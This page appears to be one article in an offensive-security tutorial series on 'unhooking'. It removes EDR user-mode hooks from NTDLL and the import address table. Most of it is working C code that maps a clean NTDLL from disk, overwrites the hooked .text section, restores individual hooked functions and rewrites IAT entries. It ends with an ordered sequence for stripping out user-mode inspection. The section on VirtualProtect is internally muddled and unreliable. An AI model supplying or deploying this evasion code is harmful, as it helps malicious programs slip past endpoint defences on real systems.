---
layout: page
title: "Unhooking: Restoring the Windows API"
---

# Unhooking: Restoring the Windows API

Every EDR that operates in user space installs hooks. A hook is a modification to the first bytes of a function in a loaded DLL, typically NTDLL, that redirects execution into the EDR's inspection code before the original function runs. The EDR examines the call, decides whether it is suspicious, and either allows it to proceed or terminates the process.

These hooks exist in your process's address space. They are bytes written into memory that your process owns. You can read them, compare them against a known-clean source, and overwrite them with the original bytes. When you do, the hook is gone and the next call to that function executes the real code with no interception.

## How Hooks Work

The standard hook is an inline patch at the function's entry point. On x64, the most common form is a `jmp` to an absolute address:

```
; Original NTDLL bytes at NtAllocateVirtualMemory entry:
4C 8B D1          mov r10, rcx
B8 18 00 00 00    mov eax, 0x18     ; syscall number
0F 05             syscall
C3                ret

; After EDR hooks it:
E9 XX XX XX XX    jmp <edr_inspection_routine>
90 90 90 90 90    nop (padding)
90 90             nop
90                nop
```

The `E9` opcode is a relative 32-bit jump. The four bytes following it encode the offset from the next instruction to the EDR's handler. When `NtAllocateVirtualMemory` is called, execution jumps into the EDR's code instead of running the syscall. The EDR inspects the arguments, logs the event, and usually calls the original function through a trampoline.

Some EDRs use a `FF 25` indirect jump through a pointer, which allows the jump target to be anywhere in 64-bit address space:

```
FF 25 00 00 00 00    jmp [rip+0]
XX XX XX XX          ; low 32 bits of target address
XX XX XX XX          ; high 32 bits of target address
```

Both forms are detectable: the first two bytes of the hooked function differ from the original.

## Finding the Clean Bytes

The source of truth is the NTDLL file on disk. Before the EDR loads and hooks it, the file contains the original code. Reading the `.text` section from disk and comparing it byte-for-byte against what is mapped in memory reveals every hooked function.

```c
#include <windows.h>

// Map a fresh copy of ntdll.dll directly from disk
HANDLE map_ntdll_from_disk(void) {
    wchar_t ntdll_path[MAX_PATH];
    GetSystemDirectoryW(ntdll_path, MAX_PATH);
    wcscat_s(ntdll_path, MAX_PATH, L"\\ntdll.dll");

    HANDLE file = CreateFileW(
        ntdll_path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (file == INVALID_HANDLE_VALUE) return NULL;

    HANDLE mapping = CreateFileMappingW(
        file, NULL,
        PAGE_READONLY | SEC_IMAGE,  // SEC_IMAGE maps as a PE image
        0, 0, NULL
    );
    CloseHandle(file);
    if (!mapping) return NULL;

    return mapping;
}
```

`SEC_IMAGE` tells the memory manager to map the file as a PE image, applying section alignment and permissions as the loader would. This gives a mapped view where RVAs match the in-memory NTDLL, making byte-for-byte comparison at corresponding addresses straightforward.

## Comparing and Restoring

With two views of NTDLL, one from disk and one already loaded in the process, compare the `.text` section and restore any bytes that differ:

```c
void unhook_ntdll(void) {
    // Get the in-memory NTDLL base
    HMODULE ntdll_mem = GetModuleHandleA("ntdll.dll");

    // Map the clean copy from disk
    HANDLE mapping = map_ntdll_from_disk();
    LPVOID ntdll_disk = MapViewOfFile(
        mapping, FILE_MAP_READ, 0, 0, 0
    );

    PIMAGE_DOS_HEADER dos =
        (PIMAGE_DOS_HEADER)ntdll_disk;
    PIMAGE_NT_HEADERS nt =
        (PIMAGE_NT_HEADERS)((ULONG_PTR)ntdll_disk + dos->e_lfanew);

    // Find the .text section
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            ULONG_PTR disk_text =
                (ULONG_PTR)ntdll_disk + section[i].VirtualAddress;
            ULONG_PTR mem_text  =
                (ULONG_PTR)ntdll_mem  + section[i].VirtualAddress;
            DWORD     text_size = section[i].Misc.VirtualSize;

            // Make the in-memory .text section writable
            DWORD old_protect;
            VirtualProtect(
                (LPVOID)mem_text, text_size,
                PAGE_EXECUTE_READWRITE, &old_protect
            );

            // Overwrite with clean bytes from disk
            memcpy((LPVOID)mem_text, (LPVOID)disk_text, text_size);

            // Restore original permissions
            VirtualProtect(
                (LPVOID)mem_text, text_size,
                old_protect, &old_protect
            );

            break;
        }
    }

    UnmapViewOfFile(ntdll_disk);
    CloseHandle(mapping);
}
```

After this runs, every function in NTDLL's `.text` section matches the on-disk version. Any hooks installed by EDRs are gone. Subsequent calls to `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, or any other NTDLL function reach the real syscall stubs without interception.

## Targeted Unhooking

Restoring the entire `.text` section is the bluntest approach. It removes every hook, including those on functions that are never called. A targeted alternative checks each function individually and only restores the ones that are actually hooked.

Detecting a hook at a specific function requires knowing what the first bytes should look like. On x64, every NTDLL syscall stub follows the same pattern: `mov r10, rcx` (`4C 8B D1`) followed by `mov eax, <syscall_number>` (`B8 xx 00 00 00`). If the first byte at a function's entry point is `E9` or `FF`, it is hooked.

```c
BOOL is_hooked(LPVOID func_addr) {
    BYTE *bytes = (BYTE *)func_addr;
    // E9 = relative jmp, FF 25 = indirect jmp
    return (bytes[0] == 0xE9 ||
           (bytes[0] == 0xFF && bytes[1] == 0x25));
}

void restore_function(LPVOID mem_func, LPVOID disk_func, SIZE_T len) {
    DWORD old;
    VirtualProtect(mem_func, len, PAGE_EXECUTE_READWRITE, &old);
    memcpy(mem_func, disk_func, len);
    VirtualProtect(mem_func, len, old, &old);
}
```

Iterating over the export table of both the in-memory and disk-mapped NTDLL, comparing addresses and checking for hook patterns, gives surgical control over which functions are restored.

## The VirtualProtect Problem

The unhooking code above calls `VirtualProtect` to make the `.text` section writable. `VirtualProtect` is itself a Win32 function that calls `NtProtectVirtualMemory` in NTDLL. If `NtProtectVirtualMemory` is hooked, calling it to prepare for unhooking triggers the very inspection you are trying to bypass.

The solution is to make `NtProtectVirtualMemory` the first function you restore, using a method that does not go through the hook. The cleanest approach: read the clean bytes of `NtProtectVirtualMemory` from the disk-mapped copy, write them directly using a `memcpy` that does not involve any other API call. Writing to the `.text` section without first calling `VirtualProtect` will fail with an access violation because the section is mapped read-execute, not read-write.

The workaround is using the `WriteProcessMemory` syscall directly, which can write to read-only pages by temporarily changing their protection at the kernel level. But `WriteProcessMemory` also goes through NTDLL. The alternative is issuing a raw `NtWriteVirtualMemory` syscall by number, bypassing NTDLL entirely. This is the domain of direct syscalls, covered in the next article.

## What Unhooking Does Not Cover

NTDLL unhooking removes user-mode hooks. It does nothing for kernel-mode detection mechanisms.

EDRs register kernel callbacks that fire regardless of what happens in user space. `PsSetLoadImageNotifyRoutine` notifies the EDR every time a new image is loaded into any process. `ObRegisterCallbacks` intercepts handle operations on process and thread objects. Minifilter drivers observe every filesystem operation. These callbacks execute in the kernel and are not visible in any user-mode DLL.

An unhooked NTDLL means your syscalls reach the kernel without user-mode interception. The kernel itself may still alert on the sequence of operations, the handle access masks, or the memory regions involved. Unhooking moves the problem from user-mode inspection to kernel-mode behavioral detection.

## IAT Hooks

Import Address Table hooks are a different mechanism. Instead of patching the function's code, the EDR overwrites the function pointer in the calling module's IAT. When the module calls an imported function, the IAT entry points to the EDR's code instead of the real function.

IAT hooks are per-module: each loaded module has its own IAT. Restoring NTDLL's `.text` section does not fix IAT hooks, because the hook is in the caller's data section, not in NTDLL. Detecting IAT hooks requires enumerating each module's import directory, reading the current IAT entries, and comparing them against the expected addresses resolved from the target DLL's export table.

```c
void check_iat_hooks(HMODULE module) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt  =
        (PIMAGE_NT_HEADERS)((ULONG_PTR)module + dos->e_lfanew);

    PIMAGE_IMPORT_DESCRIPTOR import =
        (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)module +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (import->Name) {
        const char *lib_name = (const char *)((ULONG_PTR)module + import->Name);
        HMODULE lib = GetModuleHandleA(lib_name);

        PIMAGE_THUNK_DATA thunk_orig =
            (PIMAGE_THUNK_DATA)((ULONG_PTR)module + import->OriginalFirstThunk);
        PIMAGE_THUNK_DATA thunk_iat  =
            (PIMAGE_THUNK_DATA)((ULONG_PTR)module + import->FirstThunk);

        while (thunk_orig->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME ibn =
                (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)module
                                        + thunk_orig->u1.AddressOfData);

            FARPROC expected = GetProcAddress(lib, (LPCSTR)ibn->Name);
            FARPROC actual   = (FARPROC)thunk_iat->u1.Function;

            if (expected != actual) {
                // IAT entry points somewhere other than the real function
                // Restore it
                DWORD old;
                VirtualProtect(&thunk_iat->u1.Function,
                               sizeof(ULONG_PTR),
                               PAGE_READWRITE, &old);
                thunk_iat->u1.Function = (ULONG_PTR)expected;
                VirtualProtect(&thunk_iat->u1.Function,
                               sizeof(ULONG_PTR),
                               old, &old);
            }

            thunk_orig++;
            thunk_iat++;
        }
        import++;
    }
}
```

## The Sequence in Practice

Effective unhooking follows a specific order to avoid circular dependencies:

1. Map a fresh copy of NTDLL from disk before doing anything that might trigger hooks
2. Locate `NtProtectVirtualMemory` in both the mapped and in-memory copies
3. Issue a raw syscall to change the `.text` section permissions, bypassing any hook on `NtProtectVirtualMemory`
4. Restore the entire `.text` section from the disk copy
5. Check the IAT of your own module for hooks and restore any that are modified

After step 4, all subsequent NTDLL calls go through unhooked code. Step 5 closes the IAT vector. The combination removes the user-mode inspection layer entirely.
